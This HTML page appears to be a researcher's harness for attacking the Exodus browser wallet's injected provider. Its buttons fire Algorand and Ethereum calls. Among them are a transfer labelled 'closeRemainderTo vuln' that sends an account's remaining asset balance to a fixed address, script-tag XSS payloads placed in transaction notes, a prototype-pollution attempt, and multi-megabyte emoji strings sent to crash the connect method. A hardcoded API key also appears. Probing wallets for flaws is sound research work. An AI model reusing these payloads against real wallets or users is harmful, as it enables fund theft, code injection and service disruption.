<html>
    <head>
        <title>YO</title>
        <link rel="shortcut icon" type="image/xss+svg" href="xss.svg"/>
        <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
        <script src="https://cdn.jsdelivr.net/npm/algosdk@v1.24.1/dist/browser/algosdk.min.js" integrity="sha384-cXCnQHmkjqS84S5jqAp6YXjU1ynCEJaHROHklSY7eh+cCXQ3aGX0oSgJSfQgDF5y" crossorigin="anonymous"></script>
    </head>
    <body style="background: rgb(207,31,147); background: radial-gradient(circle, rgba(10,90,200,1) 0%, rgba(150,150,250,1) 35%, rgba(50,250,100,1) 100%);">
        <script type="module">
            // PROTOTYPE POLLUTION
            //window.exodus = {}
            //window.exodus.p = {}
            //window.exodus.p["__proto__"]["isConnected"] = true

            //var payload = '\uD83D\uDC04'.repeat(10000000);
            //console.log("[*] " + payload);
            //document.title = payload;
        </script>

        <script>

            class MyEventDispatcher extends EventTarget {
                doSomething() {
                    this.dispatchEvent(new Event('ACCEPT_INCOMING_CONNECTION'));
                }
            }

            const myEventDispatcher = new MyEventDispatcher();

            function accept_connection() {
                myEventDispatcher.addEventListener('ACCEPT_INCOMING_CONNECTION', (e) => {
                    console.log('Instance fired "ACCEPT_INCOMING_CONNECTION".', e);
                });

                myEventDispatcher.doSomething();
            }

///////////////////////////////////////////////////////////////////////////////////
/////////////////////// ALGO //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////
            function algo_connect() {
                console.log("[*] CONNECT")
                window.exodus.algorand.connect();
            }


            // Sign transaction
            async function sign_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = {
                    'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
                };
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
                
                //Check your balance
                let accountInfo = await algodClient.accountInformation('RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY').do();
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
                const enc = new TextEncoder();
                const note = enc.encode('<script>alert(1)<\/script>');
                let amount = 1000000; // equals 1 ALGO
                let sender = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";

                let txn = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount
                });

                console.log("[*] txn: ");
                console.log(txn);

                const { signedTransactions } = await window.exodus.algorand.signTransaction([
                    txn.toByte(),
                ]);

                console.log('[*] Transaction: ');
                console.log(signedTransactions);
            }


            // closeRemainerTo vuln
            async function transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = {
                    'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
                };
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
                
                //Check your balance
                let accountInfo = await algodClient.accountInformation('RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY').do();
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
                
                let amount = 1000000; // equals 1 ALGO
                let sender = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";

                let txn = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount
                });

                console.log("[*] txn: ");
                console.log(txn);

                const { signedTransactions } = await window.exodus.algorand.signAndSendTransaction([
                    txn.toByte(),
                ]);

                console.log('[*] Transaction: ');
                console.log(signedTransactions);
            }


            async function asset_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = {
                    'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
                };
                const algodClient = new algosdk.Algodv2(token, baseServer, port);

                let assetID = (5235235);

                params = await algodClient.getTransactionParams().do();
                //comment out the next two lines to use suggested fee
                params.fee = 1000;
                params.flatFee = true;

                const enc = new TextEncoder();
                const note = enc.encode("<script>alert(1)<\/script>");

                let sender = window.exodus.algorand.address;
                let recipient = 'KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM';
                let revocationTarget = undefined;
                let closeRemainderTo = 'KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM';
                // We are sending 0 assets
                amount = 0;


                // signing and sending "txn" allows sender to begin accepting asset specified by creator and index
                let opttxn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget, amount, note, assetID, params);

                const signedTransactions = await window.exodus.algorand.signAndSendTransaction([
                opttxn.toByte(),
                ]);
                console.log('Tran: ');
                console.log(signedTransactions);
            }


///////////////////////////////////////////////////////////////////////////////////
/////////////////////// ETH ///////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////


            // Sign transaction
            async function request_eth_accounts() {
                try {
                    window.exodus.ethereum.request({
                        method: 'eth_accounts',
                        params: [],
                    }).then(address => console.log(`[*]eth_accounts: ${address}`))
                } catch (switchError) {
                    // This error code indicates that the chain is not supported by Exodus.
                    if (switchError.code === 4902) {
                        console.log('[-] Handle chain not supported.');
                    }
                    // Handle other "switch" errors.
                }
            }


            async function request_eth_get_balance() {
                window.exodus.ethereum.request({
                    method: 'eth_get_balance',
                    params: ["0xe7cA97fFe64282CC104dB55cab2BbA4A4e7B552E", "latest"],
                })
                .then(balance => console.log(`[*] eth_get_balance: ${balance}`))
                .catch(e => console.log('[-] eth_get_balance ERROR ', e))
            }


            async function eth_asset_transaction() {
                const transaction = {
                    from: '0xe7cA97fFe64282CC104dB55cab2BbA4A4e7B552E',
                    to: '0x5dD5B3665fd4401C09473D000DecabEa9F0c0514',
                    gas: '0x76c0', // 30400
                    gasPrice: '0x9184e72a000', // 10000000000000
                    value: '0x313030303030303030303030303030',
                }
              
                try {
                    const resp = await window.exodus.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transaction],
                    })
                    // For 'eth_sendTransaction', `resp` will be a transaction hash hexadecimal string.
                    console.log(`[*] eth_asset_transaction: ${resp}`)
                    
                } catch (err) {
                    console.log(`[-] eth_asset_transaction: ${err}`)
                }

            }


            async function eth_compileSolidity() {
                window.exodus.ethereum.request({
                    method: 'eth_compileSolidity',
                    params: ["contract test { function multiply(uint a) returns(uint d) {   return a * 7;   } }",],
                })
                .then(data => console.log(`[*] eth_compileSolidity: ${data}`))
                .catch(e => console.log('[-] eth_get_balance ERROR ', e))
            }
            

///////////////////////////////////////////////////////////////////////////////////
/////////////////////// REST //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////

            function prot_pollute() {
                window.exodus.p = {}
                window.exodus.p["__proto__"]["isConnected"] = true
            }

            function hack() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack2() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function hack3() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack4() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function change_title() {
                var payload = '\uD83D\uDC04'.repeat(10000);
                //console.log("[*] " + payload);
                document.title = payload;
            }
        </script>


        <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #F66">
        <h1 style="color:#F10;text-shadow: 2px 2px 4px #0ff;">
        49
        </h1>
        <h2>Can we hack x0-w?</h2>
        
        <hr />
        <h3>ALGO</h3>
        <hr />
        <input type="button" value="algo_connect" onclick="algo_connect()" />
        <input type="button" value="accept_connection" onclick="accept_connection()" />
        <input type="button" value="sign_transaction" onclick="sign_transaction()" />
        <input type="button" value="transaction" onclick="transaction()" />
        <input type="button" value="asset_transaction" onclick="asset_transaction()" />
        <hr />
        <h3>ETH</h3>
        <hr />
        
        <input type="button" value="request_eth_accounts" onclick="request_eth_accounts()" />
        <input type="button" value="request_eth_get_balance" onclick="request_eth_get_balance()" />
        <input type="button" value="eth_asset_transaction" onclick="eth_asset_transaction()" />
        <input type="button" value="eth_compileSolidity" onclick="eth_compileSolidity()" />
        <hr />
        <h3>REST</h3>
        <hr />
        <input type="button" value="prot_pollute" onclick="prot_pollute()" />
        <input type="button" value="hack" onclick="hack()" />
        <input type="button" value="hack2" onclick="hack2()" />
        <input type="button" value="hack3" onclick="hack3()" />
        <input type="button" value="hack4" onclick="hack4()" />
        <input type="button" value="change_title" onclick="change_title()" />
        </div>
    </body>
</html>
